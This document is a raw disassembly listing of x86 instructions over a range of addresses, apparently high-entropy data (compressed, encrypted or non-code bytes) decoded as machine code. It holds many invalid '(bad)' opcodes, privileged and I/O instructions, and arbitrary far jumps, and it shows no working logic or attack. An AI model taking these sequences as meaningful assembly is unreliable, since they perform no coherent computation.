  417ec5:	mov    WORD PTR [edx],?
  417ec7:	mov    edi,0x9eab2e52
  417ecc:	call   0x73ac5dd9
  417ed1:	push   edx
  417ed2:	adc    edi,ecx
  417ed4:	idiv   bh
  417ed6:	sti    
  417ed7:	std    
  417ed8:	jnp    0x417e83
  417eda:	xor    eax,0xdcd0b5f7
  417edf:	sub    cl,cl
  417ee1:	inc    esp
  417ee2:	ss inc ebp
  417ee4:	jmp    0x417f62
  417ee6:	add    eax,0x67c4a4cb
  417eeb:	ds jno 0x417ef9
  417eee:	in     al,0xa4
  417ef0:	dec    esi
  417ef1:	(bad)  
  417ef2:	jge    0x417ed2
  417ef4:	(bad)  
  417ef5:	bound  eax,QWORD PTR [eax]
  417ef7:	dec    ebp
  417ef8:	add    ch,BYTE PTR [ecx+0x46]
  417efb:	xlat   BYTE PTR ds:[ebx]
  417efc:	lods   al,BYTE PTR ds:[esi]
  417efd:	and    BYTE PTR [esi],0xe2
  417f00:	mov    ch,0x3f
  417f02:	xchg   ebp,eax
  417f03:	in     al,dx
  417f04:	or     cl,BYTE PTR [edx+ebp*1]
  417f07:	push   eax
  417f08:	rol    DWORD PTR [edi+0x40],1
  417f0b:	leave  
  417f0c:	mov    dl,0x3c
  417f0e:	push   ecx
  417f0f:	loope  0x417f63
  417f11:	inc    eax
  417f12:	jno    0x417f33
  417f14:	jl     0x417ec3
  417f16:	aam    0x12
  417f18:	sbb    cl,BYTE PTR [ecx+0x35]
  417f1b:	mov    al,ds:0x60704370
  417f20:	scas   eax,DWORD PTR es:[edi]
  417f21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f22:	mov    ch,0x38
  417f24:	xchg   esp,eax
  417f25:	pop    es
  417f26:	addr16 jb 0x417f80
  417f29:	lods   eax,DWORD PTR ds:[esi]
  417f2a:	xchg   esp,eax
  417f2b:	in     eax,0xdc
  417f2d:	fcomp  QWORD PTR [edx]
  417f2f:	jb     0x417ec3
  417f31:	out    dx,eax
  417f32:	xchg   edx,eax
  417f33:	adc    eax,0x7b4cfc19
  417f38:	mov    cs,WORD PTR [edi-0x4e28694f]
  417f3e:	sub    edx,DWORD PTR [ebp-0x1a]
  417f41:	jl     0x417f43
	...
  417fb3:	add    BYTE PTR [esi+0x2d],dh
  417fb6:	push   ebp
  417fb7:	inc    ecx
  417fb8:	pop    edi
  417fb9:	jns    0x418031
  417fbb:	aas    
  417fbc:	fisttp DWORD PTR [esi-0x68]
  417fbf:	inc    edx
  417fc0:	xlat   BYTE PTR ds:[ebx]
  417fc1:	cmp    al,0x69
  417fc3:	mov    esp,0x10542
  417fc8:	test   BYTE PTR [eax],0x0
  417fcb:	add    ch,bh
  417fcd:	sbb    al,0x1a
  417fcf:	mov    dl,0xf6
  417fd1:	es hlt 
  417fd3:	push   esp
  417fd4:	add    BYTE PTR [ebx+0x7c],0x49
  417fd8:	inc    ecx
  417fd9:	loope  0x417fc5
  417fdb:	(bad)  
  417fdc:	icebp  
  417fdd:	(bad)  
  417fde:	rcl    BYTE PTR ss:[edx],1
  417fe1:	fnstcw WORD PTR [ebx-0x7a876ca]
  417fe7:	fs mov dl,0x26
  417fea:	mov    ecx,0x6d3faaf8
  417fef:	jb     0x418025
  417ff1:	ds repnz pop ebx
  417ff4:	popf   
  417ff5:	idiv   BYTE PTR [ebp+0x63]
  417ff8:	xchg   ebp,eax
  417ff9:	out    0xe2,al
  417ffb:	push   edx
  417ffc:	test   al,0x1c
  417ffe:	fstp   TBYTE PTR [edx+0x25]
  418001:	shr    DWORD PTR [ebx+0x3df6d2c4],cl
  418007:	xchg   esi,eax
  418008:	add    bl,bh
  41800a:	test   al,0x6d
  41800c:	stc    
  41800d:	xchg   edi,eax
  41800e:	sahf   
  41800f:	inc    esi
  418010:	push   cs
  418011:	test   al,0x12
  418013:	lods   al,BYTE PTR ds:[esi]
  418014:	push   es
  418015:	mov    edi,0xd88665f8
  41801a:	cmp    edx,DWORD PTR [ebx+0x4d]
  41801d:	inc    esi
  41801e:	int3   
  41801f:	mov    eax,ds:0x6c885fd8
  418024:	stc    
  418025:	inc    edx
  418026:	(bad)
  418029:	into   
  41802a:	cdq    
  41802b:	dec    ebp
  41802c:	mov    cl,0xc0
  41802e:	aad    0x98
  418030:	mov    cl,0x20
  418032:	push   ds
  418033:	push   edx
  418034:	inc    esp
  418035:	xor    esi,0xe3e97a5c
  41803b:	xor    eax,0x12a8a4b5
  418040:	popa   
  418041:	sbb    ch,BYTE PTR [eax+edx*4]
  418044:	popa   
  418045:	mov    DWORD PTR [ebp+0x3b3b3431],eax
  41804b:	call   FWORD PTR [edi-0x9]
  41804e:	scas   eax,DWORD PTR es:[edi]
  41804f:	aas    
  418050:	(bad)  
  418051:	cli    
  418052:	div    BYTE PTR [eax+0x30bc041e]
  418058:	scas   eax,DWORD PTR es:[edi]
  418059:	ret    
  41805a:	and    al,dh
  41805c:	dec    ebp
  41805d:	scas   al,BYTE PTR es:[edi]
  41805e:	loope  0x41809a
  418060:	out    dx,al
  418061:	xor    ebp,esi
  418063:	and    ch,bh
  418065:	jne    0x418020
  418067:	ja     0x4180d9
  418069:	aad    0x7b
  41806b:	dec    edx
  41806c:	addr16 repnz (bad) 
  41806f:	ins    DWORD PTR es:[edi],dx
  418070:	pop    esp
  418071:	push   esi
  418072:	jge    0x41807c
  418074:	(bad)  
  418075:	aas    
  418076:	(bad)  
  418077:	jle    0x4180b7
  418079:	xor    ch,bl
  41807b:	adc    al,BYTE PTR [eax-0x6d225e9a]
  418081:	jno    0x41800e
  418083:	adc    DWORD PTR [edi-0x12],ebp
  418086:	out    dx,eax
  418087:	arpl   bx,si
  418089:	inc    esi
  41808a:	(bad)  
  41808b:	lds    edx,FWORD PTR [ecx]
  41808d:	in     al,0xa0
  41808f:	pop    ebp
  418090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418091:	fnstenv [edx-0x11e9f4ff]
  418097:	mov    bh,0x7e
  418099:	or     cl,ch
  41809b:	add    DWORD PTR [ebx+0x5e687460],0xfffffff3
  4180a2:	dec    ebp
  4180a3:	jnp    0x418035
  4180a5:	push   ds
  4180a6:	jbe    0x4180bf
  4180a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180a9:	pop    ss
  4180aa:	pop    eax
  4180ab:	mul    BYTE PTR [ecx-0x38]
  4180ae:	addr16 cmc 
  4180b0:	xchg   edi,eax
  4180b1:	push   ds
  4180b2:	stc    
  4180b3:	mov    bh,0x9f
  4180b5:	(bad)  
  4180b6:	not    ebx
  4180b8:	jle    0x418040
  4180ba:	xor    al,0x17
  4180bc:	pop    ebx
  4180bd:	(bad)  
  4180be:	neg    ecx
  4180c0:	test   edx,esp
	...
  418132:	add    BYTE PTR [eax],al
  418134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418135:	sbb    DWORD PTR [eax+0x1a],esi
  418138:	(bad)  
  418139:	jnp    0x418129
  41813b:	mov    ebp,0xe8ea9e45
  418140:	out    dx,al
  418141:	inc    ebx
  418142:	in     eax,0x69
  418144:	cmp    BYTE PTR [esi],al
  418146:	add    DWORD PTR [eax],eax
  418148:	test   BYTE PTR [eax],0x0
  41814b:	add    bl,al
  41814d:	push   esp
  41814e:	adc    edi,eax
  418150:	add    BYTE PTR [bp+si],dh
  418153:	test   eax,0x9ded18d2
  418158:	jmp    0xeced:0xaa37fb0b
  41815f:	aam    0x9d
  418161:	mov    BYTE PTR [edx+0x55d6ded9],bh
  418167:	cmp    DWORD PTR [edi],eax
  418169:	(bad)  
  41816a:	ret    0x3c4b
  41816d:	sbb    ebx,DWORD PTR [ecx+0x41]
  418170:	pop    edi
  418171:	daa    
  418172:	inc    edx
  418173:	push   0x4bb00db2
  418178:	sub    al,0xaa
  41817a:	gs pushf 
  41817c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41817d:	mov    ds:0x49df2ccc,eax
  418182:	nop
  418183:	and    edx,DWORD PTR [eax]
  418185:	sub    al,0x37
  418187:	push   edi
  418188:	ret    0xfee1
  41818b:	pop    esp
  41818c:	xor    eax,esp
  41818e:	jg     0x41817d
  418190:	cdq    
  418191:	sbb    DWORD PTR [edi-0x26674cb8],esp
  418197:	enter  0x5c65,0xbb
  41819b:	popa   
  41819c:	mov    eax,ds:0x4fb0bbb8
  4181a1:	xor    eax,0x9210b343
  4181a6:	fistp  WORD PTR [esi+ecx*8-0x7676538d]
  4181ad:	inc    esp
  4181ae:	cli    
  4181af:	(bad)  
  4181b0:	aas    
  4181b1:	sbb    BYTE PTR [ebx-0x59],bh
  4181b4:	fst    DWORD PTR [eax-0x4cbbbcd1]
  4181ba:	xchg   edi,eax
  4181bb:	lahf   
  4181bc:	imul   ecx,DWORD PTR [edx-0x7a],0x81b8b53d
  4181c3:	and    al,0x85
  4181c5:	rol    edx,0x29
  4181c8:	lods   al,BYTE PTR ds:[esi]
  4181c9:	and    esi,DWORD PTR [esi]
  4181cb:	xchg   DWORD PTR [ecx+ebp*4],ebp
  4181ce:	pop    esp
  4181cf:	retf   
  4181d0:	test   al,0xd3
  4181d2:	fstp   DWORD PTR [eax+0x6525894d]
  4181d8:	or     BYTE PTR [ebp+0x1a450486],dl
  4181de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181df:	lods   eax,DWORD PTR ds:[esi]
  4181e0:	pop    ebp
  4181e1:	(bad)  
  4181e2:	or     al,0xdc
  4181e4:	jmp    0x41822b
  4181e6:	repnz inc eax
  4181e8:	iret   
  4181e9:	fnstenv [edi+0x3d]
  4181ec:	push   ebp
  4181ed:	nop
  4181ee:	jmp    0x418223
  4181f0:	push   esp
  4181f1:	sbb    al,dh
  4181f3:	das    
  4181f4:	loopne 0x4181e9
  4181f6:	add    BYTE PTR [edi-0x59],dl
  4181f9:	cmc    
  4181fa:	test   al,0x22
  4181fc:	cmp    ebx,eax
  4181fe:	test   bh,0xec
  418201:	xchg   edx,eax
  418202:	retf   0x9b3
  418205:	jg     0x4181b2
  418207:	and    BYTE PTR [edx+0x61ea1de7],0x2d
  41820e:	jg     0x4181a0
  418210:	mov    edx,0x3f270bed
  418215:	inc    edi
  418216:	jne    0x4181c6
  418218:	and    al,0x97
  41821a:	ficomp DWORD PTR [esi-0xf]
  41821d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41821e:	fdivr  st,st(6)
  418220:	jns    0x418267
  418222:	mov    edi,0x6312f8d3
  418227:	enter  0xa24e,0xd8
  41822b:	stos   BYTE PTR es:[edi],al
  41822c:	pop    esp
  41822d:	add    BYTE PTR [edi],ch
  41822f:	cld    
  418230:	push   ebx
  418231:	in     eax,dx
  418232:	cmp    al,0xdf
  418234:	int    0xd8
  418236:	and    al,0x1b
  418238:	sbb    ebx,DWORD PTR [esi-0xa]
  41823b:	(bad)  
  41823c:	fsub   QWORD PTR [ebx-0x3c]
  41823f:	ss std 
  418241:	sub    eax,DWORD PTR [eax]
	...
  4182b3:	add    BYTE PTR [ecx-0x44],ch
  4182b6:	xlat   BYTE PTR ds:[ebx]
  4182b7:	pop    esi
  4182b8:	xlat   BYTE PTR ds:[ebx]
  4182b9:	jg     0x4182a4
  4182bb:	mov    edi,0x113ef3ec
  4182c0:	cmp    esp,ebx
  4182c2:	dec    ebx
  4182c3:	or     BYTE PTR [esi],ch
  4182c5:	pop    es
  4182c6:	add    DWORD PTR [eax],eax
  4182c8:	test   BYTE PTR [eax],0x0
  4182cb:	add    dl,ch
  4182cd:	mov    DWORD PTR ds:0xc16952e7,esp
  4182d3:	pop    ds
  4182d4:	cdq    
  4182d5:	cld    
  4182d6:	or     al,0x9b
  4182d8:	dec    ebp
  4182d9:	mov    DWORD PTR [esi],ebp
  4182db:	in     eax,dx
  4182dc:	and    al,0xdd
  4182de:	sub    DWORD PTR ds:0xd64a9907,ebx
  4182e4:	pushf  
  4182e5:	mov    dh,0x52
  4182e7:	or     esp,edx
  4182e9:	call   0xfbf2:0x96cec5ee
  4182f0:	mov    al,ch
  4182f2:	aas    
  4182f3:	dec    ecx
  4182f4:	xchg   DWORD PTR [ecx-0x3778b799],ecx
  4182fa:	and    BYTE PTR [eax+ebx*1-0x1e],dh
  4182fe:	push   es
  4182ff:	jp     0x418314
  418301:	adc    al,0xf4
  418303:	jle    0x41833a
  418305:	pop    ecx
  418306:	lock daa 
  418308:	jge    0x4182c4
  41830a:	add    eax,DWORD PTR [esi]
  41830c:	mov    edi,0x946bd382
  418311:	ret    0xb2ed
  418314:	jl     0x418370
  418316:	mov    esi,0x8ece530b
  41831b:	fnstcw WORD PTR [esi-0x13]
  41831e:	imul   edx,ebp,0xd865ddd9
  418324:	adc    ch,BYTE PTR [edi+0x54b2bbe4]
  41832a:	dec    ebp
  41832b:	mov    ds:0xa08afa02,eax
  418330:	aam    0xaa
  418332:	add    ah,BYTE PTR [ebx]
  418334:	outs   dx,DWORD PTR ds:[esi]
  418335:	in     al,dx
  418336:	in     al,0x19
  418338:	or     ah,BYTE PTR [ebp-0x7b]
  41833b:	add    DWORD PTR ds:0x6ec6de01,edx
  418341:	adc    dl,BYTE PTR [edx-0x4b]
  418344:	pop    ss
  418345:	dec    ebx
  418346:	sub    ebp,DWORD PTR [ecx]
  418348:	pop    eax
  418349:	jno    0x418340
  41834b:	je     0x418365
  41834d:	mov    ah,0x44
  41834f:	hlt    
  418350:	lods   eax,DWORD PTR ds:[esi]
  418351:	push   ecx
  418352:	ret    0xeab8
  418355:	cmp    esi,DWORD PTR [esi-0x3ad2e195]
  41835b:	fistp  DWORD PTR ds:0x79fcedb1
  418361:	cld    
  418362:	leave  
  418363:	nop
  418364:	in     eax,0xb7
  418366:	pop    esp
  418367:	cwde   
  418368:	mov    ds:0x485161a0,eax
  41836d:	out    dx,eax
  41836e:	add    DWORD PTR [edi],edx
  418370:	mov    ah,0x54
  418372:	cmp    eax,0x92e5298b
  418377:	imul   DWORD PTR [eax-0x61964197]
  41837d:	mov    eax,0x91504ab6
  418382:	jno    0x41833e
  418384:	out    dx,al
  418385:	aad    0x9f
  418387:	stos   DWORD PTR es:[edi],eax
  418388:	(bad)  
  418389:	je     0x4183c2
  41838b:	aad    0x5d
  41838d:	mov    dh,0xbd
  41838f:	push   es
  418390:	inc    ecx
  418391:	or     eax,0x5ebf9ed
  418396:	jno    0x418321
  418398:	sahf   
  418399:	cs jl  0x418320
  41839c:	sbb    BYTE PTR [eax+0x24139b4a],0x65
  4183a3:	mov    eax,ds:0x4a7035ea
  4183a8:	add    BYTE PTR [edx],0x5a
  4183ab:	push   ecx
  4183ac:	jge    0x41841e
  4183ae:	out    0x13,eax
  4183b0:	loopne 0x4183ad
  4183b2:	push   cs
  4183b3:	adc    eax,0x4a52c16a
  4183b8:	fucomip st,st(4)
  4183ba:	inc    edi
  4183bb:	clc    
  4183bc:	xchg   ebp,eax
  4183bd:	push   ds
  4183be:	push   eax
  4183bf:	jb     0x41838f
  4183c1:	add    DWORD PTR [eax],0x0
	...
  418433:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  418439:	fdivr  st(7),st
  41843b:	mov    edi,0xdccd8f2d
  418440:	jbe    0x418421
  418442:	push   0x10824fc
  418447:	add    dh,dh
  418449:	add    BYTE PTR [eax],al
  41844b:	add    BYTE PTR [ebx],bl
  41844d:	push   ebx
  41844e:	mov    eax,ds:0x7acb5bab
  418453:	and    DWORD PTR [ebx+0x6c2422c7],edi
  418459:	sbb    eax,0x84d5dda8
  41845e:	mov    bl,dl
  418460:	dec    DWORD PTR [edx-0x52]
  418463:	out    dx,al
  418464:	mov    bl,0x9b
  418466:	push   cs
  418467:	nop
  418468:	stc    
  418469:	hlt    
  41846a:	or     al,0x5e
  41846c:	xchg   dh,dh
  41846e:	cdq    
  41846f:	enter  0x55dc,0xb
  418473:	mov    dl,0x88
  418475:	jmp    0x79a3c1cc
  41847a:	loopne 0x41840b
  41847c:	test   DWORD PTR [ebx],ecx
  41847e:	stc    
  41847f:	add    ebx,DWORD PTR [ebp-0x28]
  418482:	and    al,0x2c
  418484:	and    bh,al
  418486:	ret    0xc882
  418489:	push   ds
  41848a:	inc    esi
  41848b:	imul   esp,DWORD PTR [esi-0x5b],0xffffffd5
  41848f:	add    ah,BYTE PTR ds:0x5b1fe39f
  418495:	loopne 0x418456
  418497:	ja     0x4184ce
  418499:	cmp    eax,0xe5a3233e
  41849e:	or     cl,dh
  4184a0:	push   edx
  4184a1:	mov    edi,0x9a6e3f89
  4184a6:	jge    0x418515
  4184a8:	sub    DWORD PTR [ecx],0x58
  4184ab:	xor    bl,BYTE PTR [esi+0x2e6128b7]
  4184b1:	into   
  4184b2:	dec    edx
  4184b3:	jg     0x4184a7
  4184b5:	in     eax,dx
  4184b6:	popa   
  4184b7:	mov    al,ds:0x4c17a2d5
  4184bc:	cmp    BYTE PTR gs:0xe71c1317,ch
  4184c3:	into   
  4184c4:	add    al,0xa1
  4184c6:	stos   DWORD PTR es:[edi],eax
  4184c7:	cs pop esp
  4184c9:	loope  0x41851f
  4184cb:	or     BYTE PTR [ebx],0x60
  4184ce:	neg    ecx
  4184d0:	in     al,dx
  4184d1:	lea    edi,[ecx]
  4184d3:	pop    esi
  4184d4:	sbb    DWORD PTR [ebp+0x3abfa43d],ebx
  4184da:	xor    eax,0xfb752888
  4184df:	fidivr DWORD PTR [ecx-0x38]
  4184e2:	adc    eax,0xa0bf938b
  4184e7:	and    DWORD PTR [ebx],0xfdcb070
  4184ed:	lods   al,BYTE PTR ds:[esi]
  4184ee:	sbb    DWORD PTR [edx],ecx
  4184f0:	mov    edx,0x4221fcc3
  4184f5:	jne    0x4184d2
  4184f7:	pop    esi
  4184f8:	ror    BYTE PTR [ebp+0x12],cl
  4184fb:	imul   ebp,DWORD PTR [ecx+0x1d],0x40
  4184ff:	mov    cl,0x51
  418501:	mov    eax,0x2b9d8c2c
  418506:	jge    0x418497
  418508:	clc    
  418509:	inc    esp
  41850a:	fisub  DWORD PTR [eax-0x1bc125ab]
  418510:	das    
  418511:	sbb    edi,esi
  418513:	(bad)  
  418514:	inc    esi
  418515:	add    BYTE PTR [ebx+0x7ac84693],ch
  41851b:	dec    ebp
  41851c:	mov    al,ds:0xf1bcaa62
  418521:	jl     0x41852e
  418523:	cmovne ebp,DWORD PTR [ebx-0x29]
  418527:	push   0x4611f3ba
  41852c:	push   ebp
  41852d:	xor    BYTE PTR [esi-0x42],dh
  418530:	xchg   ebx,eax
  418531:	or     al,0xa0
  418534:	jle    0x418581
  418536:	inc    esp
  418537:	jp     0x4184dd
  418539:	aas    
  41853a:	mov    dl,0xc8
  41853c:	jp     0x4185a5
  41853e:	out    dx,eax
  41853f:	int3   
  418540:	out    0x7a,eax
	...
  4185b2:	add    BYTE PTR [eax],al
  4185b4:	test   eax,0xdf4fd367
  4185b9:	(bad)  
  4185ba:	mov    ebp,0x15c03be7
  4185bf:	stc    
  4185c0:	sub    eax,edx
  4185c2:	fs push esp
  4185c4:	sbb    cl,BYTE PTR [ecx]
  4185c6:	add    DWORD PTR [eax],eax
  4185c8:	test   BYTE PTR [eax],0x0
  4185cb:	add    BYTE PTR [ebx],dl
  4185cd:	or     dl,0xd
  4185d0:	nop
  4185d1:	rcl    DWORD PTR [edx+0x0],1
  4185d4:	mov    ds:0xeff3927c,eax
  4185d9:	adc    edi,DWORD PTR [esp+esi*8]
  4185dc:	sbb    esi,DWORD PTR [esp+edx*4+0x42]
  4185e0:	call   0x8313:0x134829a9
  4185e7:	je     0x4185d3
  4185e9:	in     al,dx
  4185ea:	out    0x26,al
  4185ec:	jp     0x41863c
  4185ee:	or     DWORD PTR [eax+edi*8-0x4c39ab1e],ecx
  4185f5:	clc    
  4185f6:	xchg   esp,eax
  4185f7:	inc    esi
  4185f8:	test   al,0x6e
  4185fa:	pop    eax
  4185fb:	sbb    edi,DWORD PTR [eax+0x46b388b3]
  418601:	inc    ebx
  418602:	mov    dh,0x18
  418604:	test   dh,bh
  418606:	jne    0x418619
  418608:	sbb    dl,BYTE PTR [ebp+0x53]
  41860b:	xor    bh,al
  41860d:	pop    es
  41860e:	dec    ebp
  41860f:	xchg   edi,eax
  418610:	ret    
  418611:	lock popa 
  418613:	enter  0xa41b,0xf1
  418617:	jp     0x41862a
  418619:	test   al,0x8a
  41861b:	psubw  mm1,QWORD PTR [ebp+0x42]
  41861f:	retf   
  418620:	or     ebx,DWORD PTR [ebp+0x1015d832]
  418626:	popa   
  418627:	push   edx
  418628:	stos   BYTE PTR es:[edi],al
  418629:	iret   
  41862a:	xor    DWORD PTR [edi],edx
  41862c:	dec    edx
  41862d:	imul   edx,DWORD PTR [esi-0x32],0x5a
  418631:	push   ebx
  418632:	lock rol DWORD PTR [bp+si-0x5766],1
  418638:	ins    BYTE PTR es:[edi],dx
  418639:	lahf   
  41863a:	sahf   
  41863b:	inc    ebp
  41863c:	scas   al,BYTE PTR es:[edi]
  41863d:	xchg   edi,eax
  41863e:	(bad)  
  41863f:	mov    cs,WORD PTR [edx+ebp*1]
  418642:	(bad)  
  418644:	test   al,0x47
  418646:	xchg   ebp,eax
  418647:	pop    es
  418648:	push   0x76b3d747
  41864d:	or     al,0x81
  41864f:	add    al,0xa1
  418651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418652:	in     eax,0x60
  418654:	xchg   ecx,eax
  418655:	push   es
  418656:	inc    esi
  418657:	push   esp
  418658:	ret    
  418659:	repnz aas 
  41865b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41865c:	outs   dx,BYTE PTR ds:[esi]
  41865d:	pop    esi
  41865e:	pop    edi
  41865f:	std    
  418660:	cli    
  418661:	ret    
  418662:	push   0x5e
  418664:	push   ss
  418665:	jno    0x41866b
  418667:	(bad)  
  418668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418669:	cmp    ah,BYTE PTR [eax]
  41866b:	inc    ecx
  41866c:	mov    BYTE PTR [ebx-0x764fdd53],ah
  418672:	mov    al,0x41
  418674:	add    ebx,0xf6790c87
  41867a:	add    bl,BYTE PTR [edi+0xf589fed]
  418680:	jp     0x41863c
  418682:	pop    es
  418683:	push   0xad8ea1e9
  418688:	inc    ecx
  418689:	ins    BYTE PTR es:[edi],dx
  41868a:	mov    bh,0xb6
  41868c:	mov    ebx,0xfe6aa3df
  418691:	adc    eax,0x92107fec
  418696:	or     al,0xa4
  418698:	cmp    eax,0x45fe7e3d
  41869d:	and    al,0xe8
  41869f:	adc    al,0x7
  4186a1:	xchg   DWORD PTR [ebx],eax
  4186a3:	and    al,0x2a
  4186a5:	sub    eax,DWORD PTR [ebp+0x28]
  4186a8:	and    eax,0x7f75a45a
  4186ad:	or     dl,BYTE PTR [edi-0x4d]
  4186b0:	lods   al,BYTE PTR ds:[esi]
  4186b1:	jnp    0x4186d9
  4186b3:	or     ah,ah
  4186b5:	mov    eax,ds:0xdd1a438a
  4186ba:	out    0x28,al
  4186bc:	sub    dh,ch
  4186be:	cdq    
  4186bf:	mov    bl,0x22
  4186c1:	adc    al,0x0
	...
  418733:	add    cl,ch
  418735:	push   cs
  418736:	(bad)  
  418737:	pop    ss
  418738:	push   edi
  41873a:	jmp    0xecc1a73d
  41873f:	sub    esp,DWORD PTR [ebx-0xf]
  418742:	jge    0x418704
  418744:	adc    BYTE PTR [edx],cl
  418746:	add    DWORD PTR [eax],eax
  418748:	test   BYTE PTR [eax],0x0
  41874b:	add    BYTE PTR [edx+edi*8-0x53154445],bh
  418752:	in     eax,0x87
  418754:	outs   dx,DWORD PTR ds:[esi]
  418755:	into   
  418756:	adc    eax,0x570374fd
  41875b:	leave  
  41875c:	jno    0x418734
  41875e:	test   BYTE PTR [ebx-0x33],bl
  418761:	iret   
  418762:	mov    es,WORD PTR [esi]
  418764:	xor    eax,0x3b7cd8a8
  418769:	aas    
  41876a:	(bad)  
  41876b:	mov    al,ss:0xf608bad3
  418771:	daa    
  418772:	xor    al,bl
  418774:	popa   
  418775:	hlt    
  418776:	adc    eax,0x217fa0da
  41877b:	add    eax,0x551712dd
  418780:	mov    edi,0x8a153d9
  418785:	js     0x418796
  418787:	outs   dx,DWORD PTR ds:[esi]
  418788:	push   eax
  418789:	mov    DWORD PTR [eax+0x106afb78],edx
  41878f:	call   DWORD PTR [eax+0x3da00d6c]
  418795:	jb     0x41878e
  418797:	push   es
  418798:	push   edx
  418799:	adc    bh,BYTE PTR es:[eax]
  41879c:	pop    ss
  41879d:	retf   
  41879e:	scas   al,BYTE PTR es:[edi]
  41879f:	and    al,BYTE PTR [edi-0x497e2bce]
  4187a5:	mov    ds:0x33bdf05a,eax
  4187aa:	jecxz  0x418808
  4187ac:	cmp    dl,ah
  4187ae:	js     0x418744
  4187b0:	xchg   esi,eax
  4187b1:	add    ebp,edi
  4187b3:	ss clc 
  4187b5:	jb     0x4187ea
  4187b7:	xor    BYTE PTR [ebp+0x1bdef087],0x8c
  4187be:	pop    edi
  4187bf:	add    BYTE PTR [esp+edi*4-0x14],dh
  4187c3:	or     DWORD PTR [edx],ebx
  4187c5:	mov    dh,0x36
  4187c7:	popf   
  4187c8:	loop   0x4187ed
  4187ca:	test   DWORD PTR [ebx+0x2a],ecx
  4187cd:	fild   DWORD PTR [edx+0x13949218]
  4187d3:	test   DWORD PTR [esi-0x569ac059],esp
  4187d9:	jbe    0x4187dc
  4187db:	xor    al,ah
  4187dd:	xchg   esi,eax
  4187de:	dec    ebp
  4187df:	push   ss
  4187e0:	jl     0x4187fe
  4187e2:	sub    ebp,DWORD PTR [edi]
  4187e4:	sbb    edx,DWORD PTR [edx]
  4187e6:	ror    DWORD PTR [ecx+esi*8],1
  4187e9:	cmp    BYTE PTR [ecx+0x1c1fa0b6],0x33
  4187f0:	aam    0xd5
  4187f2:	sub    dh,BYTE PTR ds:0x30365f6c
  4187f8:	arpl   WORD PTR [ebx],sp
  4187fa:	(bad)  
  4187fb:	mov    ebp,0x41977038
  418800:	dec    ebx
  418801:	inc    edx
  418802:	jecxz  0x418792
  418804:	pop    ebp
  418805:	stc    
  418806:	xchg   ecx,eax
  418807:	xor    dh,BYTE PTR [eax-0x6e]
  41880a:	jmp    0x418839
  41880c:	pop    edi
  41880d:	int3   
  41880e:	fmul   st(6),st
  418810:	jo     0x418814
  418812:	cmp    bh,BYTE PTR [esi+0x44]
  418815:	fs mov al,0x30
  418818:	sahf   
  418819:	push   esp
  41881a:	sbb    al,BYTE PTR [esp+ebp*1-0x6a0c6b25]
  418821:	mov    bh,0x64
  418823:	test   al,0x4e
  418825:	dec    ecx
  418826:	jb     0x418849
  418828:	les    edi,FWORD PTR [eax]
  41882a:	rcr    BYTE PTR [edx],1
  41882c:	fsubr  st,st(5)
  41882e:	call   0x5be26128
  418833:	sub    cl,BYTE PTR [edi-0x6714fd37]
  418839:	sbb    eax,0x9d67333e
  41883e:	mov    eax,ds:0xe73c12
	...
  4188b3:	add    BYTE PTR [eax+0x41],bl
  4188b6:	pop    ds
  4188b7:	lods   eax,DWORD PTR ds:[esi]
  4188b8:	pop    ds
  4188b9:	(bad)  
  4188ba:	cli    
  4188bb:	cmc    
  4188bc:	inc    ebx
  4188bd:	mov    ss:0xb5ed2b32,al
  4188c3:	mov    al,0x6
  4188c5:	or     eax,DWORD PTR [ecx]
  4188c7:	add    dh,dh
  4188c9:	add    BYTE PTR [eax],al
  4188cb:	add    BYTE PTR [ebp-0x71075e3b],dl
  4188d1:	lahf   
  4188d2:	or     ch,al
  4188d4:	mov    ds,WORD PTR [edi]
  4188d6:	xchg   BYTE PTR [eax-0x15b19b66],bh
  4188dc:	shr    DWORD PTR [edx],1
  4188de:	jg     0x4188ff
  4188e0:	sbb    bh,BYTE PTR [edx-0x6b6097ba]
  4188e6:	lahf   
  4188e7:	pop    es
  4188e8:	cmc    
  4188e9:	sub    BYTE PTR [ebx-0x70],cl
  4188ec:	xor    bl,ah
  4188ee:	mov    esi,DWORD PTR [ecx+0x6f]
  4188f1:	inc    ebp
  4188f2:	nop
  4188f3:	and    edx,DWORD PTR [ebx+0x5da511d8]
  4188f9:	test   eax,0xc9c5d6b0
  4188fe:	dec    esp
  4188ff:	dec    ebx
  418900:	inc    esp
  418901:	push   ss
  418902:	aam    0x95
  418904:	loope  0x4188f0
  418906:	xor    bl,BYTE PTR [eax+0x72]
  418909:	les    ebp,FWORD PTR [ebx]
  41890b:	lahf   
  41890c:	fld    QWORD PTR [ecx+eiz*4]
  41890f:	cmc    
  418910:	jb     0x418904
  418912:	sbb    eax,0xbd440a1a
  418917:	mov    bl,0xf5
  418919:	add    BYTE PTR [eax-0x7fd0fcdb],dh
  41891f:	fcomp  st(5)
  418921:	icebp  
  418922:	cdq    
  418923:	xlat   BYTE PTR ds:[ebx]
  418924:	adc    edx,DWORD PTR ds:0x5fe70be9
  41892a:	inc    ebp
  41892b:	and    bh,BYTE PTR [esi+0x7d]
  41892e:	call   0x270178cf
  418933:	fincstp 
  418935:	jnp    0x418932
  418937:	aad    0x73
  418939:	sbb    eax,0x1864f093
  41893e:	mov    eax,ds:0x18ce30df
  418943:	inc    eax
  418944:	dec    ecx
  418945:	xchg   ecx,eax
  418946:	xchg   edi,eax
  418947:	mov    cl,0xab
  418949:	pusha  
  41894a:	pmaxsw mm5,QWORD PTR [esi]
  41894d:	cwde   
  41894e:	mov    ebx,edi
  418950:	cwde   
  418951:	cmc    
  418952:	xchg   edi,eax
  418953:	rol    DWORD PTR [esi+0x57ec7c8b],1
  418959:	adc    BYTE PTR [ebp+0xe],0xcd
  41895d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41895e:	iret   
  41895f:	es push edi
  418961:	popa   
  418962:	int    0x4e
  418964:	ret    
  418965:	jl     0x41892c
  418967:	(bad)  
